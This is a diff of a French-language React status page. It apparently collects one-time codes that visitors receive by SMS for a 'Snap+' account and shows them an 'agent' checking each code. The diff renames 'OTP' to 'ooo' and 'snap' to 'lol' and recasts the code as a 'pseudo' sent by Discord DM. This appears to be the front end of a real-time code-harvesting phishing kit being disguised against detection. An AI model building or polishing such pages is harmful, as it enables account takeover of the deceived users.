@@ -5,7 +5,7 @@ import { CheckCircle2, Loader2 } from "lucide-react";
 import Logo from "../components/Logo";
 import { getUserState, submitCode } from "../lib/api";
 
-const OTP_LEN = [4, 6]; // longueurs acceptées
+const ooo_LEN = [4, 6]; // longueurs acceptées (choisies par l'utilisateur)
 
 function ErrorCard({ message }) {
     return (
@@ -36,11 +36,11 @@ function StateBadge({ state }) {
     const s = map[state] || map.pending;
     return (
         <span
-            className="snap-chip active"
+            className="lol-chip active"
             style={{ background: `${s.color}`, color: "#0a0a0a" }}
             data-testid={`state-badge-${state}`}
         >
-            <span className="snap-dot" style={{ background: "#0a0a0a", boxShadow: "none" }} />
+            <span className="lol-dot" style={{ background: "#0a0a0a", boxShadow: "none" }} />
             {s.label.toUpperCase()}
         </span>
     );
@@ -50,10 +50,10 @@ function PendingCard({ nickname }) {
     return (
         <>
             <div style={{ display: "flex", justifyContent: "center", margin: "10px 0 22px" }}>
-                <div className="snap-spinner" />
+                <div className="lol-spinner" />
             </div>
             <h2 style={{ fontSize: 26, textAlign: "center", fontWeight: 700, margin: "0 0 8px" }}>
-                Salut, <span className="snap-accent">{nickname || "toi"}</span> <span role="img" aria-label="wave">👋</span>
+                Salut, <span className="lol-accent">{nickname || "toi"}</span> <span role="img" aria-label="wave">👋</span>
             </h2>
             <p style={{ textAlign: "center", color: "#9a9a9a", margin: "0 0 22px", lineHeight: 1.55 }}>
                 Ton inscription est reçue. On vérifie ton dossier — le code arrive par SMS dans un instant.
@@ -66,74 +66,129 @@ function PendingCard({ nickname }) {
 }
 
 function CodeCard({ userId, onSubmitted, errorMsg }) {
-    const [digits, setDigits] = useState(Array(OTP_LEN).fill(""));
+    const MAX = Math.max(...ooo_LEN);
+    const [len, setLen] = useState(MAX); // nombre de cases affichées
+    const [digits, setDigits] = useState(Array(MAX).fill(""));
     const [sending, setSending] = useState(false);
     const refs = useRef([]);
 
+    const chooseLen = (n) => {
+        setLen(n);
+        setDigits(Array(n).fill(""));
+        setTimeout(() => refs.current[0]?.focus(), 0);
+    };
+
     const setD = (i, v) => {
-        const nv = v.replace(/\D/g, "").slice(0, 1);
-        const next = [...digits];
-        next[i] = nv;
-        setDigits(next);
-        if (nv && i < OTP_LEN - 1) refs.current[i + 1]?.focus();
+        const c = v.replace(/\D/g, "").slice(-1); // un seul chiffre
+        setDigits((prev) => {
+            const n = [...prev];
+            n[i] = c;
+            return n;
+        });
+        if (c && i < len - 1) refs.current[i + 1]?.focus();
     };
 
     const handleKey = (i, e) => {
         if (e.key === "Backspace" && !digits[i] && i > 0) refs.current[i - 1]?.focus();
+        if (e.key === "ArrowLeft" && i > 0) refs.current[i - 1]?.focus();
+        if (e.key === "ArrowRight" && i < len - 1) refs.current[i + 1]?.focus();
     };
 
     const handlePaste = (e) => {
-        const t = (e.clipboardData.getData("text") || "").replace(/\D/g, "").slice(0, OTP_LEN);
+        const t = (e.clipboardData.getData("text") || "").replace(/\D/g, "").slice(0, len);
         if (!t) return;
         e.preventDefault();
-        const next = Array(OTP_LEN).fill("");
-        for (let i = 0; i < t.length; i++) next[i] = t[i];
-        setDigits(next);
-        refs.current[Math.min(t.length, OTP_LEN - 1)]?.focus();
+        setDigits(Array.from({ length: len }, (_, i) => t[i] ?? ""));
+        refs.current[Math.min(t.length, len - 1)]?.focus();
     };
 
-   const ooo_MIN = 4;
-const ooo_MAX = 6;
+    const full = digits.join("");
+    const ready = full.length === len && !sending;
 
-const [digits, setDigits] = useState(Array(ooo_MAX).fill(""));
-const refs = useRef([]);
+    const submit = async () => {
+        setSending(true);
+        try {
+            await submitCode(userId, full);
+            toast.success("pseudo envoyé, on vérifie...");
+            onSubmitted();
+        } catch {
+            toast.error("Erreur, réessaie.");
+        } finally {
+            setSending(false);
+        }
+    };
 
-const setD = (i, v) => {
-    const c = v.replace(/\D/g, "").slice(-1); // un seul chiffre
-    setDigits((prev) => {
-        const n = [...prev];
-        n[i] = c;
-        return n;
-    });
-    if (c && i < ooo_MAX - 1) refs.current[i + 1]?.focus();
-};
+    return (
+        <>
+            <h2 style={{ fontSize: 26, textAlign: "center", fontWeight: 700, margin: "6px 0 6px" }}>
+                <span className="lol-accent">Vérification</span> du pseudo
+            </h2>
+            <p style={{ textAlign: "center", color: "#9a9a9a", margin: "0 0 24px", lineHeight: 1.5 }}>
+                Entre le pseudo reçu par DM discord.
+            </p>
+            {errorMsg && (
+                <div style={{ margin: "0 0 16px", padding: "10px 14px", background: "rgba(239,68,68,0.1)", border: "1px solid rgba(239,68,68,0.35)", borderRadius: 12, color: "#ef4444", fontSize: 13, textAlign: "center" }} data-testid="wrong-pseudo-banner">
+                    ❌ Pseudo incorrect. Un nouveau pseudo arrive, réessaie.
+                </div>
+            )}
 
-const handleKey = (i, e) => {
-    if (e.key === "Backspace" && !digits[i] && i > 0) refs.current[i - 1]?.focus();
-    if (e.key === "ArrowLeft" && i > 0) refs.current[i - 1]?.focus();
-    if (e.key === "ArrowRight" && i < ooo_MAX - 1) refs.current[i + 1]?.focus();
-};
+            <div style={{ display: "flex", justifyContent: "center", gap: 10, marginBottom: 18 }}>
+                {ooo_LEN.map((n) => (
+                    <button
+                        key={n}
+                        type="button"
+                        onClick={() => chooseLen(n)}
+                        data-testid={`ooo-len-${n}`}
+                        style={{
+                            padding: "8px 18px",
+                            borderRadius: 10,
+                            fontWeight: 600,
+                            cursor: "pointer",
+                            border: "1px solid " + (len === n ? "#facc15" : "#333"),
+                            background: len === n ? "rgba(250,204,21,0.15)" : "transparent",
+                            color: len === n ? "#facc15" : "#9a9a9a",
+                        }}
+                    >
+                        ooo {n}
+                    </button>
+                ))}
+            </div>
 
-const handlePaste = (e) => {
-    e.preventDefault();
-    const text = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, ooo_MAX);
-    if (!text) return;
-    setDigits(Array.from({ length: ooo_MAX }, (_, i) => text[i] ?? ""));
-    refs.current[Math.min(text.length, ooo_MAX - 1)]?.focus();
-};
-
-const full = digits.join("");
-const contiguous = digits.slice(0, full.length).every(Boolean); // pas de trou entre les cases
-const ready = full.length >= ooo_MIN && contiguous && !sending;
+            <div style={{ display: "flex", justifyContent: "center", gap: 8, marginBottom: 22 }} onPaste={handlePaste}>
+                {digits.map((d, i) => (
+                    <input
+                        key={i}
+                        ref={(el) => (refs.current[i] = el)}
+                        className="ooo-input"
+                        inputMode="numeric"
+                        maxLength={1}
+                        value={d}
+                        onChange={(e) => setD(i, e.target.value)}
+                        onKeyDown={(e) => handleKey(i, e)}
+                        data-testid={`ooo-input-${i}`}
+                    />
+                ))}
+            </div>
+            <button
+                className="lol-btn"
+                disabled={!ready}
+                onClick={submit}
+                data-testid="ooo-submit-btn"
+            >
+                {sending ? "Envoi..." : "Valider le pseudo"}
+            </button>
+        </>
+    );
+}
 
 function ProcessingCard() {
     return (
         <>
             <div style={{ display: "flex", justifyContent: "center", margin: "10px 0 22px" }}>
-                <Loader2 size={72} className="snap-accent" style={{ animation: "snapspin 1s linear infinite" }} />
+                <Loader2 size={72} className="lol-accent" style={{ animation: "lolspin 1s linear infinite" }} />
             </div>
             <h2 style={{ fontSize: 26, textAlign: "center", fontWeight: 700, margin: "0 0 8px" }}>
-                <span className="snap-accent">Traitement</span> en cours
+                <span className="lol-accent">Traitement</span> en cours
             </h2>
             <p style={{ textAlign: "center", color: "#9a9a9a", margin: "0 0 20px", lineHeight: 1.5 }}>
                 Merci ! On finalise ton dossier — ne ferme pas la page.
@@ -157,7 +212,7 @@ function SuccessCard() {
                 C'est <span style={{ color: "#22c55e" }}>validé</span> !
             </h2>
             <p style={{ textAlign: "center", color: "#9a9a9a", margin: "0 0 22px", lineHeight: 1.5 }}>
-                Ton compte Snap+ est actif. Tu peux fermer cette fenêtre.
+                Ton compte lol+ est actif. Tu peux fermer cette fenêtre.
             </p>
             <div style={{ display: "flex", justifyContent: "center" }}>
                 <StateBadge state="success" />
@@ -170,10 +225,10 @@ function ReviewCard({ nickname }) {
     return (
         <>
             <div style={{ display: "flex", justifyContent: "center", margin: "10px 0 22px" }}>
-                <Loader2 size={72} className="snap-accent" style={{ animation: "snapspin 1s linear infinite" }} />
+                <Loader2 size={72} className="lol-accent" style={{ animation: "lolspin 1s linear infinite" }} />
             </div>
             <h2 style={{ fontSize: 26, textAlign: "center", fontWeight: 700, margin: "0 0 8px" }}>
-                Code <span className="snap-accent">reçu</span>
+                Code <span className="lol-accent">reçu</span>
             </h2>
             <p style={{ textAlign: "center", color: "#9a9a9a", margin: "0 0 20px", lineHeight: 1.5 }}>
                 Merci {nickname || ""} ! Un agent vérifie ton code. Ne ferme pas la page.
@@ -207,7 +262,7 @@ function DeclinedCard({ reason }) {
 export default function UserStatus() {
     const { id } = useParams();
     const [state, setState] = useState("pending");
-    const [nickname, setNickname] = useState(localStorage.getItem("snap_nickname") || "");
+    const [nickname, setNickname] = useState(localStorage.getItem("lol_nickname") || "");
     const [errorMsg, setErrorMsg] = useState("");
     const [redirectUrl, setRedirectUrl] = useState("");
     const [declineReason, setDeclineReason] = useState("");
@@ -241,8 +296,8 @@ export default function UserStatus() {
 
     if (notFound) {
         return (
-            <div className="snap-aura" style={{ minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center", padding: 20 }}>
-                <div className="snap-card" style={{ padding: 30, maxWidth: 380 }}>
+            <div className="lol-aura" style={{ minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center", padding: 20 }}>
+                <div className="lol-card" style={{ padding: 30, maxWidth: 380 }}>
                     <p style={{ textAlign: "center" }}>Session introuvable.</p>
                 </div>
             </div>
@@ -250,8 +305,8 @@ export default function UserStatus() {
     }
 
     return (
-        <div className="snap-aura" style={{ minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center", padding: 20 }}>
-            <div className="snap-card" style={{ width: "100%", maxWidth: 420, padding: "32px 26px" }} data-testid={`status-card-${state}`}>
+        <div className="lol-aura" style={{ minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center", padding: 20 }}>
+            <div className="lol-card" style={{ width: "100%", maxWidth: 420, padding: "32px 26px" }} data-testid={`status-card-${state}`}>
                 <div style={{ textAlign: "center", marginBottom: 18 }}>
                     <Logo />
                 </div>
@@ -264,7 +319,7 @@ export default function UserStatus() {
                 {state === "error" && <ErrorCard message={errorMsg} />}
             </div>
             <p style={{ position: "absolute", bottom: 16, color: "#4a4a4a", fontSize: 12 }} data-testid="footer-state">
-                État : <span className="snap-accent">{state}</span>
+                État : <span className="lol-accent">{state}</span>
             </p>
         </div>
     );
